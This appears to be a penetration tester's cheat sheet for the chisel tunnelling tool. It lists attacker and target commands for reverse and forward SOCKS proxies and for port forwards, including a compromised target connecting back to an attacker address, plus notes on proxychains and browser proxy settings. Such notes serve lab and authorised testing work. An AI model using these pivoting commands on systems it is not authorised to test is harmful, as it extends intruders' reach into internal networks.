### Chisel client/server --help

### Author: https://github.com/jpillora/chisel/releases

### Reverse SOCKS proxy

 - Attacker:

       ./chisel server -p LISTENING_PORT --reverse &

 - Target:

       ./chisel client ATTACK_IP:LISTEN_PORT R:0.0.0.0:1080:SOCKS &

 - Attacker:

       ./chisel client ATTACK_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT

 - Target:

       ./chisel server -p TARGET_PORT --socks5

### Then open the web browser in Kali and configure the proxy settings.

#### 1) Go to "Manual Proxy configuration"

#### 2) On "SOCKS Host", add 127.0.0.1 on port 1080 and click the SOCKS5 radio button

#### 3) On "No proxy for", add 127.0.0.1

#### 4) On browser, connect to our target IP

### Forward SOCKS proxy

 - Target:

       ./chisel server -p LISTEN_PORT --socks5

 - Attacker:


       ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

## TIP


#### Set the port in the proxychains file. (SOCKS5)

#### If you use forward proxy, set the port to whichever one you opened.

### Local Port Forward

 - Target:

       ./chisel server -p LISTEN_PORT

 - Attacker:

       ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

### Remote Port Forward

 - Attacker:

       ./chisel server -p LISTEN_PORT --reverse &

 - Target:

       ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

### Then on our machine, we browse to 

    http://127.0.0.1:TARGET_LOCAL_PORT


## TIP


#### Also use jobs then kill %num for chisel background processes too.

#### And use proxychains on your attacking machine
